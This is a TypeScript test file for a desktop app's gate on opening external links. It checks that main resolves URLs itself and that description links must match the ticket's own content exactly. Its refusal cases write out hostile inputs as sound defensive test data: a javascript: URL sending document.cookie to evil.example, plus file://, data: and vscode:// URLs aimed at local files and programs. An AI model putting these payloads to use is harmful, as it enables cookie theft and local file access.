import { describe, expect, it } from 'vitest'
import { descriptionLinkOpener, linkOpener } from '../src/main/links.js'

/**
 * The gate on `shell.openExternal`.
 *
 * Two claims, and the first is the one that does the work:
 *
 * 1. The renderer cannot name a URL. It names a subject; main resolves it.
 * 2. Whatever comes back is checked again before it reaches the OS.
 *
 * Without (1), (2) is only as good as the scheme check — and a scheme check is a
 * blocklist argument, which is the kind that eventually loses. With (1) there is
 * no argument to attack: the renderer has nowhere to put a URL.
 */

function opener(resolved: { url: string; fellBack: boolean }) {
  const opened: string[] = []
  const dispatched: { operation: string; payload: unknown }[] = []

  const open = linkOpener({
    dispatch: (operation, payload) => {
      dispatched.push({ operation, payload })
      return Promise.resolve(resolved)
    },
    openExternal: (url) => {
      opened.push(url)
      return Promise.resolve()
    },
  })

  return { open, opened, dispatched }
}

describe('opening a row', () => {
  it('resolves the subject through core rather than trusting a URL', async () => {
    const o = opener({ url: 'https://example.atlassian.net/browse/GC-1', fellBack: false })
    await o.open({ subjectKey: 'jira:example/GC-1' })

    expect(o.dispatched).toEqual([
      { operation: 'links.resolve', payload: { subjectKey: 'jira:example/GC-1' } },
    ])
    expect(o.opened).toEqual(['https://example.atlassian.net/browse/GC-1'])
  })

  it('passes the requested target through when there is one', async () => {
    const o = opener({ url: 'https://github.com/o/r', fellBack: true })
    await o.open({ subjectKey: 'repo:github.com/o/r#feature', target: 'repository' })

    expect(o.dispatched[0]?.payload).toEqual({
      subjectKey: 'repo:github.com/o/r#feature',
      target: 'repository',
    })
  })

  it('reports the fallback so the UI can say why it opened something broader', async () => {
    const o = opener({ url: 'https://github.com/o/r', fellBack: true })
    expect(await o.open({ subjectKey: 'repo:github.com/o/r#never-pushed' })).toEqual({
      url: 'https://github.com/o/r',
      fellBack: true,
    })
  })
})

describe('the second check, at the line where a string becomes an OS action', () => {
  // Each of these would be reachable only if core's own check regressed. That is
  // exactly when a second check earns its keep — and the failure it prevents is
  // `shell.openExternal` handing a path to Explorer or a scheme to whatever
  // registered it.
  for (const url of [
    'file:///C:/Windows/System32/calc.exe',
    'javascript:fetch("https://evil.example?"+document.cookie)',
    'http://example.com',
    'data:text/html,<script>alert(1)</script>',
    'vscode://file/etc/passwd',
    'not a url at all',
  ]) {
    it(`refuses ${url.slice(0, 32)}`, async () => {
      const o = opener({ url, fellBack: false })

      await expect(o.open({ subjectKey: 'jira:example/GC-1' })).rejects.toThrow(/non-https/)
      expect(o.opened).toEqual([])
    })
  }
})

/**
 * The description-link path, which is the one place a URL comes *from* the
 * renderer (007).
 *
 * The claim above — "the renderer has nowhere to put a URL" — cannot cover a
 * link inside a ticket description, because such a link is an arbitrary provider
 * URL and is not the subject of anything. The obvious answer was a channel that
 * opens any https URL, and it would have replaced a structural property with a
 * scheme check: exactly the blocklist argument the note above says eventually
 * loses.
 *
 * So the renderer sends the URL **and the ticket it claims to be on**, and main
 * asks core what that ticket's description actually contains. An injected script
 * can send any string it likes; every string that is not already on the
 * operator's own board is refused, on this side of the boundary.
 */

const DESCRIPTION = [
  {
    kind: 'paragraph',
    content: [
      { kind: 'text', text: 'see ', marks: { strong: false, em: false, code: false, href: null } },
      {
        kind: 'text',
        text: 'the RFC',
        marks: { strong: false, em: false, code: false, href: 'https://example.com/rfc' },
      },
    ],
  },
  {
    kind: 'table',
    rows: [
      [
        {
          header: false,
          content: [
            {
              kind: 'paragraph',
              content: [
                {
                  kind: 'text',
                  text: 'in a cell',
                  marks: { strong: false, em: false, code: false, href: 'https://example.com/cell' },
                },
              ],
            },
          ],
        },
      ],
    ],
  },
]

function descriptionOpener(description: unknown) {
  const opened: string[] = []
  const dispatched: { operation: string; payload: unknown }[] = []

  const open = descriptionLinkOpener({
    dispatch: (operation, payload) => {
      dispatched.push({ operation, payload })
      return Promise.resolve({ data: { ticket: { description } }, freshness: {}, partial: false })
    },
    openExternal: (url) => {
      opened.push(url)
      return Promise.resolve()
    },
  })

  return { open, opened, dispatched }
}

describe('opening a link inside a description', () => {
  it('asks core for the ticket rather than trusting the page about it', async () => {
    const o = descriptionOpener(DESCRIPTION)
    await o.open({ subjectKey: 'jira:example/GC-1', url: 'https://example.com/rfc' })

    // The membership set is built from core's copy of the description, not from
    // anything the renderer sent. That is the whole mechanism: the page supplies
    // a candidate, main supplies the answer.
    expect(o.dispatched).toEqual([{ operation: 'work.get', payload: { key: 'jira:example/GC-1' } }])
    expect(o.opened).toEqual(['https://example.com/rfc'])
  })

  it('finds a link inside a table cell', async () => {
    // Missing these would make exactly the links in the most structured part of
    // a description the ones that silently do nothing, which reads as a bug in
    // tables rather than as a rule about links.
    const o = descriptionOpener(DESCRIPTION)
    await o.open({ subjectKey: 'jira:example/GC-1', url: 'https://example.com/cell' })

    expect(o.opened).toEqual(['https://example.com/cell'])
  })

  it('refuses a URL the description does not contain', async () => {
    // The assertion the feature rests on. A renderer with a script in it can
    // call this with anything; this is what makes "anything" useless.
    const o = descriptionOpener(DESCRIPTION)

    await expect(
      o.open({ subjectKey: 'jira:example/GC-1', url: 'https://evil.example/steal' }),
    ).rejects.toThrow(/not in .* description/)

    expect(o.opened).toEqual([])
  })

  it('refuses a near miss rather than matching loosely', async () => {
    // Exact string equality, not a prefix or a host comparison. A host check
    // would accept `https://example.com/anything`, and a prefix check would
    // accept `https://example.com/rfc.evil.test`.
    const o = descriptionOpener(DESCRIPTION)

    await expect(
      o.open({ subjectKey: 'jira:example/GC-1', url: 'https://example.com/rfc/../admin' }),
    ).rejects.toThrow(/not in .* description/)
    await expect(
      o.open({ subjectKey: 'jira:example/GC-1', url: 'https://example.com/' }),
    ).rejects.toThrow(/not in .* description/)

    expect(o.opened).toEqual([])
  })

  it('still refuses a non-https link that the description does contain', async () => {
    // Membership is not enough on its own: the provider writes the description,
    // so a `javascript:` URL in one would otherwise have answered the membership
    // question in its own favour. Two checks, and this is the second.
    const o = descriptionOpener([
      {
        kind: 'paragraph',
        content: [
          {
            kind: 'text',
            text: 'click',
            marks: { strong: false, em: false, code: false, href: 'javascript:alert(1)' },
          },
        ],
      },
    ])

    await expect(
      o.open({ subjectKey: 'jira:example/GC-1', url: 'javascript:alert(1)' }),
    ).rejects.toThrow(/non-https/)

    expect(o.opened).toEqual([])
  })

  it('refuses everything when the ticket is not in the mirror', async () => {
    // FR-131's case reaching this path: the active ticket may be one the board
    // does not hold, and then there is no description to be a member of. The
    // safe answer is no rather than an empty set treated as permissive.
    const o = descriptionOpener(null)

    await expect(
      o.open({ subjectKey: 'jira:example/GC-9999', url: 'https://example.com/rfc' }),
    ).rejects.toThrow(/not in .* description/)

    expect(o.opened).toEqual([])
  })
})
